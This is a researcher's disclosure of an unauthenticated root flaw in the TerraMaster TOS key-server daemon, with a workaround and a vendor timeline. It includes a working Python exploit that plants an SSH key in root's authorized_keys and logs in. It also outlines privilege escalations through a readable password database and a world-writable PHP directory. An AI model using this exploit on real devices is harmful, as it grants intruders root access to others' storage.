# TerraMaster TOS rsync key-server remote root

In releases of TOS before 4.2.09[2], there exists a vulnerable daemon called
`key-server`, that is started when rsync is enabled, which writes arbitrary data
to `/root/.ssh/authorized_keys` without authentication.

## Bug

TOS include a binary called `key-server`, which has no documentation. There is
also another binary called `key-client` for talking to it.

It runs a network service on TCP 1888 and is started by the init script in
`/etc/init.d/rsync_service`:

```bash
 24 service_prepare(){                                                         
 25     [ ! -d $basedir ] && mkdir -p $basedir                                 
 26     [ ! -d $lockdir ] && mkdir -p $lockdir                                 
 27     chmod 600 ${passfile}                                                  
 28     /sbin/svrcfg-all -c rsync                                              
>29     # ssh 免密传输...                                                      
>30     key-server >/dev/null &                                                
 31     rm -fr /var/run/rsyncd.pid                                             
 32 }
```

The comment in Chinese translates as "ssh confidential transmission...".

It included the following usage string:

```
Usage:rsynctool-server [option]
								-d  daemon
								-h help message
```

With no more details.

When analysed in Ghidra, I saw that it reads a 32 bit int containing 1, along
with an ssh key, and writes the ssh key to `/root/.ssh/authorized_keys`

Root can login, as `PermitRootLogin yes` is in `/etc/ssh/sshd_config`.

## Checking Devices

The easiest way to check is to portscan your TOS device and see if ports 22 and
1888 are open (e.g `nmap -p 22,1888 HOST`). If so, the exploit should work.

## Workaround

As Terramaster has only released the patch for x86, owners of ARM devices can
work around the flaw by removing `key-server >/dev/null &` from
`/etc/init.d/rsync_service` and restarting the device.

The official patch just deleted the `key-server` and `key-client` binaries and
didn't edit this file.

## Exploit

```python3
# Terra-Master rsync key-server "exploit"
#
# enable rsync on your nas, run this, get a root shell.
#
# My lawyer sayz:
#  "This is provided only for the use in the *authorized* testing of systems.
#   no warranty is provided"
#
# Released under the terms of the MIT license https://mit-license.org/
#
# B Horn - 2021
#
# GH: @bahorn
# 
# usage:
#   python terramaster_key_server.py <HOST> ~/.ssh/id_rsa.pub

import socket
import struct
import sys
import os

TCP_IP = sys.argv[1]
TCP_PORT = 1888  # key-server port.

# Read in the SSH key passed
key = open(sys.argv[2]).read()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
# This refers to the "command". The code just checks if it's set to one.
s.send(struct.pack('I', 1))
# Send over our SSH key and it'll be added to /root/.ssh/authorized_keys
s.send(key)
# The server responds with it's length.
print(s.recv(1024))

# Login
os.system('ssh root@{}'.format(TCP_IP))
```

## Other issues

These are less of a concern as non-admin users no longer will have ssh access as
of the 4.2.10 beta:

* `/etc/base/nasdb` is world readable, allowing any user with shell access to read
the `user_table`, and attempt to crack the password hashes. As the password for
admin is the same for the root user, this can be used to escalate privileges.

(LFDs in the web app have also been reported in the past (See CVE-2020-28187
[1]), and as php scripts are interpreted as root you can just read `/etc/shadow`
, but if they ever fix that this is another option to exploit them)

* http://nas:8181/databack/ is symlinked `/tmp/databack`, which is world
writable. As the php scripts run as root, a unprivileged user can drop a php
script in  the directory and execute it by going to
http://nas:8181/databack/example.php, running their script with root permissions.

(These were validated last year, changes may have been made that stop these,
which wasn't immediately visible from reviewing firmware images)

## Other Notes

Do check out ihteams work on terramaster [1], they seemed to have a far better
experience with them than I did. I suspect what they did better than me was
getting a CVE authority involved.

## Recommendations for Terramaster

* Please establish a proper security contact on your core development team.
* When a researcher reports a flaw, give a timeline for the patch to be released.
* Security updates must be released across all platforms simultaneously. It's
generally simple for researchers to rediscover flaws knowing what has changed.

I shouldn't need to follow up so much to get an issue fixed.

## Timeline

* 2020-05-29 - Reached out to support AT terra-master DOT com to get a security
contact.
* 2020-05-30 - Was told to just forward details onto the support email.
* 2020-05-30 - Provided my research.
* 2020-05-31 - Received confirmation they got my information.
* 2020-06-02 - Was told they forwarded my information onto the Tech department.
* 2021-01-11 - Attempted to reestablish contact, as no details have been
provided since then.
* 2021-01-15 - After no response, I informed them of my intention of publicly
disclosing my research on Feb 1st.
* 2021-01-19 - Confirmation that it will be included in the next release of TOS (4.2.9).
* 2021-02-03 - TOS4.2.9 is released for x86 products, not ARM. [2]
* 2021-02-21 - Follow up regarding arm release, express some concerns on the quality of the patch.
* 2021-02-23 - support confirms they'll chase it.
* 2021-03-20 - Following up again, as lack of updates. State my intentions to
  disclosure publically on the 28th if a patch isn't avaliable for ARM.
* 2021-03-28 - No follow up, releasing notes.

# References

* [1] https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/
* [2] https://forum.terra-master.com/en/viewtopic.php?f=28&t=1536
